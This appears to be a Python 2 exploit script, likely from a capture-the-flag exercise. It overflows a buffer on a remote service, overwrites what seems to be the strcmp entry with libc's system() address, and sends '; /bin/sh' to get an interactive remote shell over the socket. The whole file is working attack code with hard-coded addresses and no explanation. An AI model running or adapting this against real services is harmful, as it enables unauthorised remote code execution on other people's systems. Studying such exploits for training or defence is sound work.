#!/usr/bin/python
# -*- coding:utf-8 -*-

import os,sys,socket,struct,telnetlib

def sock(remoteip,remoteport):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((remoteip,remoteport))
    f = s.makefile('rw',bufsize=0)
    return s,f

def read_until(f,delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

p32=lambda x:struct.pack('<I',x)

strcmp_plt_addr=0x8049adc
system_addr_offset=0x00040310
system_addr_offset=0x0003ab30
libc_base=0xb7e33000
libc_base=0xb7e12000
libc_base=0xb7e08000

buf='A'*32
buf+=p32(strcmp_plt_addr)

buf2=p32(libc_base+system_addr_offset)
buf2+='; /bin/sh'

remoteip=sys.argv[1]
remoteport=int(sys.argv[2])
s,f=sock(remoteip,remoteport)
print s.recv(65535)
s.send(buf+'\n')
print s.recv(65535)
s.send(buf2+'\n')
shell(s)
